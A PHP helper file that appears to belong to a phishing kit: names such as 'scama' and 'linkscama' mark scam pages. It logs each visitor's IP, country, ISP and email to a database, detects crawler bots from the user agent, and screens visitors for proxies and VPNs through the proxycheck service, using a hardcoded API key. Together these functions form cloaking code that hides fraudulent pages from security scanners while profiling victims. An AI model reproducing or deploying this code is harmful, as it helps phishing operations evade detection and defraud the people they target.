<?php
require_once('../vendor/autoload.php');

use MaxMind\Db\Reader;
use DeviceDetector\DeviceDetector;
use DeviceDetector\Parser\Device\AbstractDeviceParser;

function get_client_ip()
{
    $ipaddresstrue = '';

    if (getenv('REMOTE_ADDR') == '127.0.0.1') {
        $ipaddresstrue = '45.126.185.232';
    } else {

        if (getenv('HTTP_CLIENT_IP'))
            $ipaddresstrue = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddresstrue = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddresstrue = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddresstrue = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddresstrue = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddresstrue = getenv('REMOTE_ADDR');
        else
            $ipaddresstrue = '45.126.185.232';
    }
    return trim($ipaddresstrue);
}

function getCountry()
{
    $GeoLite = new Reader('../core/maxmind/GeoLite2-City.mmdb');
    $asn = new Reader('../core/maxmind/GeoLite2-ASN.mmdb');

    $GeoLite = $GeoLite->get(get_client_ip());
    $asn = $asn->get(get_client_ip());

    $result = array(
        'country'           => $GeoLite['country']['names']['en'],
        'country_code'      => $GeoLite['country']['iso_code'],
        'continent'         => $GeoLite['continent']['names']['en'],
        'isp'               => $asn['autonomous_system_organization'],
        'ip'                => get_client_ip(),
    );

    return $result;
}

function insertVisitor($origin, $linkscama, $blocked, $email)
{
    $country = getCountry();
    $ip = $country['ip'];
    $country_code = $country['country_code'];
    $country_name = $country['country'];

    $date = date('Y-m-d H:i:s');

    global $conn;

    $sql = "INSERT INTO visitor (ips, code_country, country, origin, scama, date,blocked,email) VALUES (:ip,:country_code,:country_name,:origin,:linkscama,:date,:blocked,:email)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':ip', $ip);
    $stmt->bindParam(':country_code', $country_code);
    $stmt->bindParam(':country_name', $country_name);
    $stmt->bindParam(':origin', $origin);
    $stmt->bindParam(':linkscama', $linkscama);
    $stmt->bindParam(':date', $date);
    $stmt->bindParam(':blocked', $blocked);
    $stmt->bindParam(':email', $email);
    $stmt->execute();
    $stmt->closeCursor();

    return $conn->lastInsertId();
}

function deviceBot()
{
    AbstractDeviceParser::setVersionTruncation(AbstractDeviceParser::VERSION_TRUNCATION_NONE);
    $ua = $_SERVER['HTTP_USER_AGENT'];
    // $ua = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
    $dd = new DeviceDetector($ua);
    $dd->parse();
    if ($dd->isBot()) {
        return 'YES';
    } else {
        return 'NO';
    }
}

function ipbot()
{
    $proxycheck_options = array(
        'API_KEY' => '41l248-757m2a-b98979-kr5763', // Your API Key.
        'ASN_DATA' => 0, // Enable ASN data response.
        'DAY_RESTRICTOR' => 7, // Restrict checking to proxies seen in the past # of days.
        'VPN_DETECTION' => 1, // Check for both VPN's and Proxies instead of just Proxies.
        'RISK_DATA' => 1, // 0 = Off, 1 = Risk Score (0-100), 2 = Risk Score & Attack History.
        'INF_ENGINE' => 1, // Enable or disable the real-time inference engine.
        'TLS_SECURITY' => 0, // Enable or disable transport security (TLS).
        'QUERY_TAGGING' => 1, // Enable or disable query tagging.
        'MASK_ADDRESS' => 1, // Anonymises the local-part of an email address (e.g. anonymous@domain.tld)
        'CUSTOM_TAG' => '', // Specify a custom query tag instead of the default (Domain+Page).
        'BLOCKED_COUNTRIES' => array('Wakanda', 'WA'), // Specify an array of countries or isocodes to be blocked.
        'ALLOWED_COUNTRIES' => array('Azeroth', 'AJ') // Specify an array of countries or isocodes to be allowed.
    );

    $result_array = \proxycheck\proxycheck::check(get_client_ip(), $proxycheck_options);
    return $result_array;
}
